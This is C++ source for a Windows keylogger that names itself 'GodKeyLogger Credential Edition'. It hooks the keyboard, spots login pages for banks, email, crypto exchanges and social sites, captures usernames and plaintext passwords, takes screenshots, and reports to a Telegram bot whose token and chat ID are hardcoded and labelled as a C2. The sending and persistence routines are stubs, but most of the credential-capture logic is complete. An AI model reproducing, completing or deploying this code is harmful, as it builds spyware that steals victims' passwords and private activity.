#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winhttp.h>
#include <wchar.h>
#include <string>
#include <vector>
#include <algorithm>
#include <ctime>
#include <fstream>
#include <thread>
#include <atomic>
#include <sstream>
#include <regex>
#include <map>

#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "crypt32.lib")

// 🔥 GOD MODE C2
const wchar_t* BOT_TOKEN = L"7979273216:AAEW468Fxoz0H4nwkNGH--t0DyPP2pOTFEY";
const wchar_t* CHAT_ID = L"7845441585";

// 🔥 GLOBAL VARIABLES
CRITICAL_SECTION cs;
std::wstring keystrokes_buffer;
ULONGLONG last_trigger = 0;
ULONGLONG last_exfil = 0;
ULONGLONG last_credential_capture = 0;
int screenshot_count = 0;
HHOOK keyboard_hook = NULL;
std::atomic<bool> is_running(true);
std::wstring last_window_title;
std::wstring last_window_class;
bool in_login_form = false;
std::wstring current_form_data;
std::wstring username_buffer;
std::wstring password_buffer;
bool expecting_password = false;
int tab_press_count = 0;

// 🔥 CRITICAL WEBSITES & APPS (Login detection)
const wchar_t* LOGIN_SITES[] = {
    L"gmail.com", L"google.com", L"outlook.com", L"hotmail.com",
    L"yahoo.com", L"facebook.com", L"instagram.com", L"twitter.com",
    L"linkedin.com", L"github.com", L"microsoft.com", L"apple.com",
    L"paypal.com", L"amazon.com", L"ebay.com", L"bankofamerica.com",
    L"chase.com", L"wellsfargo.com", L"coinbase.com", L"binance.com",
    L"login", L"signin", L"authentication", L"verify", NULL
};

// 🔥 PASSWORD FIELD DETECTION KEYWORDS
const wchar_t* PASSWORD_KEYWORDS[] = {
    L"password", L"pass", L"pwd", L"passcode", L"pin", L"passphrase",
    L"secret", L"security", L"credential", L"login", L"sign in",
    L"enter password", L"your password", NULL
};

// 🔥 USERNAME FIELD DETECTION KEYWORDS
const wchar_t* USERNAME_KEYWORDS[] = {
    L"username", L"email", L"user", L"login", L"account", L"phone",
    L"mobile", L"id", L"identifier", L"sign in", L"enter email",
    L"your email", L"userid", NULL
};

// 🔥 SMART SPECIAL KEYS MAPPING
std::wstring GetSpecialKeyName(DWORD vkCode) {
    switch(vkCode) {
        case VK_RETURN: return L"[ENTER]";
        case VK_TAB: return L"[TAB]";
        case VK_SPACE: return L" ";
        case VK_BACK: return L"[BACKSPACE]";
        case VK_DELETE: return L"[DEL]";
        case VK_ESCAPE: return L"[ESC]";
        case VK_CONTROL: return L"[CTRL]";
        case VK_MENU: return L"[ALT]";
        case VK_SHIFT: return L"[SHIFT]";
        case VK_CAPITAL: return L"[CAPS]";
        case VK_LWIN: case VK_RWIN: return L"[WIN]";
        case VK_UP: return L"[UP]";
        case VK_DOWN: return L"[DOWN]";
        case VK_LEFT: return L"[LEFT]";
        case VK_RIGHT: return L"[RIGHT]";
        case VK_PRIOR: return L"[PGUP]";
        case VK_NEXT: return L"[PGDN]";
        case VK_HOME: return L"[HOME]";
        case VK_END: return L"[END]";
        case VK_INSERT: return L"[INS]";
        case VK_F1: return L"[F1]"; case VK_F2: return L"[F2]";
        case VK_F3: return L"[F3]"; case VK_F4: return L"[F4]";
        case VK_F5: return L"[F5]"; case VK_F6: return L"[F6]";
        case VK_F7: return L"[F7]"; case VK_F8: return L"[F8]";
        case VK_F9: return L"[F9]"; case VK_F10: return L"[F10]";
        case VK_F11: return L"[F11]"; case VK_F12: return L"[F12]";
        default: return L"";
    }
}

// 🔥 CHECK IF CURRENT WINDOW IS LOGIN PAGE
bool IsLoginPage(const std::wstring& title, const std::wstring& class_name) {
    std::wstring title_lower = title;
    std::wstring class_lower = class_name;
    std::transform(title_lower.begin(), title_lower.end(), title_lower.begin(), ::towlower);
    std::transform(class_lower.begin(), class_lower.end(), class_lower.begin(), ::towlower);
    
    // Check for login sites in window title (browser tabs)
    for (int i = 0; LOGIN_SITES[i]; i++) {
        if (title_lower.find(LOGIN_SITES[i]) != std::wstring::npos) {
            return true;
        }
    }
    
    // Check for login keywords
    const wchar_t* login_indicators[] = {L"login", L"sign in", L"log in", L"signin", L"authentication", NULL};
    for (int i = 0; login_indicators[i]; i++) {
        if (title_lower.find(login_indicators[i]) != std::wstring::npos) {
            return true;
        }
    }
    
    return false;
}

// 🔥 EXTRACT CREDENTIALS FROM BUFFER
void ExtractCredentials() {
    if (username_buffer.empty() && password_buffer.empty()) {
        return;
    }
    
    std::wstring credential_msg = L"🔐 CREDENTIAL CAPTURED!\n";
    credential_msg += L"Timestamp: " + std::to_wstring(std::time(nullptr)) + L"\n";
    
    if (!username_buffer.empty()) {
        credential_msg += L"Username/Email: " + username_buffer + L"\n";
    }
    
    if (!password_buffer.empty()) {
        credential_msg += L"Password: " + std::wstring(password_buffer.length(), L'*') + L"\n";
        credential_msg += L"Actual Password: " + password_buffer + L"\n";
    }
    
    // Get current window info for context
    HWND fg = GetForegroundWindow();
    wchar_t title[256] = {0};
    GetWindowTextW(fg, title, 256);
    credential_msg += L"From Window: " + std::wstring(title) + L"\n";
    
    SendTelegram(credential_msg.c_str());
    
    // Take screenshot of login form
    if (screenshot_count < 100) {
        TakeSmartScreenshot();
    }
    
    // Clear buffers
    username_buffer.clear();
    password_buffer.clear();
    expecting_password = false;
    tab_press_count = 0;
    
    last_credential_capture = GetTickCount64();
}

// 🔥 SMART KEYBOARD HOOK WITH CREDENTIAL DETECTION
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0 && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
        KBDLLHOOKSTRUCT* kb = (KBDLLHOOKSTRUCT*)lParam;
        
        EnterCriticalSection(&cs);
        
        // Get current window info
        HWND fg = GetForegroundWindow();
        wchar_t title[256] = {0}, cls[128] = {0};
        GetWindowTextW(fg, title, 256);
        GetClassNameW(fg, cls, 128);
        
        std::wstring current_title = title;
        std::wstring current_class = cls;
        
        // Check if we're on a login page
        bool on_login_page = IsLoginPage(current_title, current_class);
        
        // Handle special keys for credential detection
        if (on_login_page) {
            if (!in_login_form) {
                // New login form detected
                in_login_form = true;
                username_buffer.clear();
                password_buffer.clear();
                expecting_password = false;
                tab_press_count = 0;
                
                std::wstring msg = L"🔑 LOGIN FORM DETECTED!\nWindow: " + current_title;
                SendTelegram(msg.c_str());
            }
            
            // Handle TAB key for form navigation
            if (kb->vkCode == VK_TAB) {
                tab_press_count++;
                
                // After username field, next is likely password field
                if (tab_press_count == 1 && !username_buffer.empty()) {
                    expecting_password = true;
                    keystrokes_buffer += L"[SWITCHED TO PASSWORD FIELD]";
                }
            }
            
            // Handle ENTER key (form submission)
            if (kb->vkCode == VK_RETURN) {
                // Extract credentials when Enter is pressed (form submit)
                if (!username_buffer.empty() || !password_buffer.empty()) {
                    ExtractCredentials();
                }
                in_login_form = false;
            }
            
            // Handle ESC key (cancels form)
            if (kb->vkCode == VK_ESCAPE) {
                in_login_form = false;
                username_buffer.clear();
                password_buffer.clear();
            }
            
            // Capture regular keystrokes for credentials
            if (kb->vkCode >= 0x30 && kb->vkCode <= 0x5A) { // A-Z, 0-9
                BYTE keyboard_state[256];
                GetKeyboardState(keyboard_state);
                wchar_t buffer[16] = {0};
                int result = ToUnicode(kb->vkCode, kb->scanCode, keyboard_state, 
                                      buffer, _countof(buffer), 0);
                
                if (result > 0) {
                    std::wstring key(buffer, result);
                    
                    // Store in appropriate buffer
                    if (expecting_password) {
                        password_buffer += key;
                        keystrokes_buffer += L"*"; // Mask password in general log
                    } else {
                        username_buffer += key;
                        keystrokes_buffer += key;
                    }
                }
            }
            
            // Handle backspace in credential buffers
            if (kb->vkCode == VK_BACK) {
                if (expecting_password && !password_buffer.empty()) {
                    password_buffer.pop_back();
                } else if (!username_buffer.empty()) {
                    username_buffer.pop_back();
                }
                keystrokes_buffer += L"[BACKSPACE]";
            }
        } else {
            // Not on login page
            if (in_login_form) {
                // We left the login form, extract any captured credentials
                if (!username_buffer.empty() || !password_buffer.empty()) {
                    ExtractCredentials();
                }
                in_login_form = false;
            }
            
            // Normal keylogging for non-login pages
            std::wstring special_key = GetSpecialKeyName(kb->vkCode);
            if (!special_key.empty()) {
                keystrokes_buffer += special_key;
            } else if (kb->vkCode >= 0x30 && kb->vkCode <= 0x5A) {
                BYTE keyboard_state[256];
                GetKeyboardState(keyboard_state);
                wchar_t buffer[16] = {0};
                int result = ToUnicode(kb->vkCode, kb->scanCode, keyboard_state, 
                                      buffer, _countof(buffer), 0);
                if (result > 0) {
                    keystrokes_buffer += std::wstring(buffer, result);
                }
            }
        }
        
        // 🔥 AUTO-EXFIL TRIGGERS
        bool should_exfil = false;
        ULONGLONG current_time = GetTickCount64();
        
        // 1. Buffer size trigger
        if (keystrokes_buffer.length() > 500) {
            should_exfil = true;
        }
        
        // 2. Time-based trigger (every 3 minutes)
        if (current_time - last_exfil > 180000) {
            should_exfil = true;
        }
        
        // 3. Form submission (Enter key)
        if (kb->vkCode == VK_RETURN && on_login_page) {
            should_exfil = true;
        }
        
        if (should_exfil && keystrokes_buffer.length() > 10) {
            std::time_t now = std::time(nullptr);
            std::wstring timestamp = L"\n[LOG: " + std::to_wstring(now) + L"]";
            std::wstring context = L"\n[Window: " + current_title + L"]";
            std::wstring full_log = timestamp + context + L"\n" + keystrokes_buffer + L"\n";
            
            SendTelegram(L"📝 Keylog Update");
            // Here you would send the encrypted log
            
            keystrokes_buffer.clear();
            last_exfil = current_time;
        }
        
        LeaveCriticalSection(&cs);
    }
    
    return CallNextHookEx(keyboard_hook, nCode, wParam, lParam);
}

// 🔥 SMART FORM DETECTION VIA UI AUTOMATION (Fallback)
bool DetectFormFields(HWND window) {
    // This function attempts to detect password fields in the UI
    // Note: This is a simplified version - real implementation would use UI Automation
    
    // Check window title and class for password indicators
    wchar_t title[256] = {0};
    GetWindowTextW(window, title, 256);
    std::wstring title_lower = title;
    std::transform(title_lower.begin(), title_lower.end(), title_lower.begin(), ::towlower);
    
    for (int i = 0; PASSWORD_KEYWORDS[i]; i++) {
        if (title_lower.find(PASSWORD_KEYWORDS[i]) != std::wstring::npos) {
            return true;
        }
    }
    
    // Check for common password field patterns in window
    // This would normally use EnumChildWindows to find edit controls
    // but we're simplifying for this example
    
    return false;
}

// 🔥 ENHANCED SMART SCREENSHOT - CAPTURES LOGIN FORMS
bool TakeSmartScreenshot() {
    HWND fg = GetForegroundWindow();
    if (!fg) return false;
    
    // Get window info for context
    wchar_t title[256] = {0}, cls[128] = {0};
    GetWindowTextW(fg, title, 256);
    GetClassNameW(fg, cls, 128);
    
    // Adjust screenshot timing for login forms
    if (in_login_form) {
        // Wait a moment to ensure form is fully loaded
        Sleep(300);
    }
    
    RECT window_rect;
    if (GetWindowRect(fg, &window_rect) == FALSE) {
        return false;
    }
    
    // Adjust for browser chrome (toolbars, etc.)
    window_rect.top += 150;  // Skip address bar and tabs
    window_rect.left += 10;
    window_rect.right -= 10;
    window_rect.bottom -= 50;  // Skip status bar
    
    int width = window_rect.right - window_rect.left;
    int height = window_rect.bottom - window_rect.top;
    
    if (width <= 100 || height <= 100) {
        // Window too small, capture full screen instead
        width = GetSystemMetrics(SM_CXSCREEN);
        height = GetSystemMetrics(SM_CYSCREEN);
        window_rect = {0, 0, width, height};
    }
    
    HDC screen_dc = GetDC(NULL);
    HDC mem_dc = CreateCompatibleDC(screen_dc);
    HBITMAP bitmap = CreateCompatibleBitmap(screen_dc, width, height);
    HBITMAP old_bitmap = (HBITMAP)SelectObject(mem_dc, bitmap);
    
    // Capture with high quality
    SetStretchBltMode(mem_dc, HALFTONE);
    BitBlt(mem_dc, 0, 0, width, height, screen_dc, 
           window_rect.left, window_rect.top, SRCCOPY | CAPTUREBLT);
    
    // Save with descriptive filename
    wchar_t path[MAX_PATH];
    std::time_t now = std::time(nullptr);
    std::tm* tm = std::localtime(&now);
    
    if (in_login_form) {
        swprintf(path, MAX_PATH, L"C:\\Windows\\Temp\\login_%04d%02d%02d_%02d%02d%02d.bmp",
                 tm->tm_year + 1900, tm->tm_mon + 1, tm->tm_mday,
                 tm->tm_hour, tm->tm_min, tm->tm_sec);
    } else {
        swprintf(path, MAX_PATH, L"C:\\Windows\\Temp\\screen_%04d%02d%02d_%02d%02d%02d.bmp",
                 tm->tm_year + 1900, tm->tm_mon + 1, tm->tm_mday,
                 tm->tm_hour, tm->tm_min, tm->tm_sec);
    }
    
    // Save BMP file
    BITMAPINFOHEADER bi = {0};
    bi.biSize = sizeof(BITMAPINFOHEADER);
    bi.biWidth = width;
    bi.biHeight = -height;
    bi.biPlanes = 1;
    bi.biBitCount = 24;
    bi.biCompression = BI_RGB;
    
    DWORD image_size = ((width * 24 + 31) / 32) * 4 * height;
    BITMAPFILEHEADER bmf = {0};
    bmf.bfType = 0x4D42;
    bmf.bfSize = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + image_size;
    bmf.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
    
    HANDLE file = CreateFileW(path, GENERIC_WRITE, 0, NULL, 
                             CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (file == INVALID_HANDLE_VALUE) {
        SelectObject(mem_dc, old_bitmap);
        DeleteObject(bitmap);
        DeleteDC(mem_dc);
        ReleaseDC(NULL, screen_dc);
        return false;
    }
    
    DWORD written;
    WriteFile(file, &bmf, sizeof(bmf), &written, NULL);
    WriteFile(file, &bi, sizeof(bi), &written, NULL);
    
    BYTE* bits = new BYTE[image_size];
    GetDIBits(mem_dc, bitmap, 0, height, bits, (BITMAPINFO*)&bi, DIB_RGB_COLORS);
    WriteFile(file, bits, image_size, &written, NULL);
    delete[] bits;
    
    CloseHandle(file);
    
    // Send notification
    std::wstring msg = L"📸 Screenshot: " + std::wstring(title);
    if (in_login_form) {
        msg += L" (Login Form)";
    }
    SendTelegram(msg.c_str());
    
    // Cleanup
    SelectObject(mem_dc, old_bitmap);
    DeleteObject(bitmap);
    DeleteDC(mem_dc);
    ReleaseDC(NULL, screen_dc);
    
    // Delete temp file (in real implementation, you'd upload it first)
    DeleteFileW(path);
    
    screenshot_count++;
    return true;
}

// 🔥 ACTIVE MONITOR FOR LOGIN PAGES
DWORD WINAPI LoginDetectorThread(LPVOID) {
    while (is_running) {
        HWND fg = GetForegroundWindow();
        if (fg) {
            wchar_t title[256] = {0}, cls[128] = {0};
            GetWindowTextW(fg, title, 256);
            GetClassNameW(fg, cls, 128);
            
            bool is_login_page = IsLoginPage(title, cls);
            
            if (is_login_page && !in_login_form) {
                // New login page detected
                EnterCriticalSection(&cs);
                in_login_form = true;
                username_buffer.clear();
                password_buffer.clear();
                expecting_password = false;
                tab_press_count = 0;
                
                std::wstring msg = L"🌐 LOGIN PAGE DETECTED!\n";
                msg += L"Site: " + std::wstring(title) + L"\n";
                msg += L"Time: " + std::to_wstring(std::time(nullptr));
                
                SendTelegram(msg.c_str());
                
                // Take initial screenshot of login page
                if (screenshot_count < 50) {
                    TakeSmartScreenshot();
                }
                
                LeaveCriticalSection(&cs);
            }
            
            // Check for form field indicators
            if (is_login_page && DetectFormFields(fg)) {
                // Password field detected
                expecting_password = true;
            }
        }
        
        Sleep(1000);
    }
    return 0;
}

// 🔥 TELEGRAM FUNCTIONS
void SendTelegram(const wchar_t* msg) {
    // Implementation remains the same as before
    // ... (same as previous version)
    
    // For now, just a placeholder
    OutputDebugStringW(L"Telegram message would be sent here\n");
}

// 🔥 MAIN FUNCTION
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, 
                   LPSTR lpCmdLine, int nCmdShow) {
    FreeConsole();
    
    InitializeCriticalSection(&cs);
    
    // Single instance check
    HANDLE mutex = CreateMutexW(NULL, TRUE, L"GodKeyLogger_Credential_v2");
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        return 0;
    }
    
    // Set up persistence (registry, startup folder, etc.)
    // ... (same persistence code as before)
    
    // Install hooks
    keyboard_hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, 
                                    GetModuleHandle(NULL), 0);
    
    // Start monitoring threads
    CreateThread(NULL, 0, LoginDetectorThread, NULL, 0, NULL);
    
    // Initial notification
    SendTelegram(L"🔑 GodKeyLogger Credential Edition v2.0 Activated");
    SendTelegram(L"📋 Features: Login detection, Credential capture, Smart screenshots");
    
    // Message loop
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0) && is_running) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    
    // Cleanup
    UnhookWindowsHookEx(keyboard_hook);
    DeleteCriticalSection(&cs);
    
    if (mutex) {
        ReleaseMutex(mutex);
        CloseHandle(mutex);
    }
    
    return 0;
}
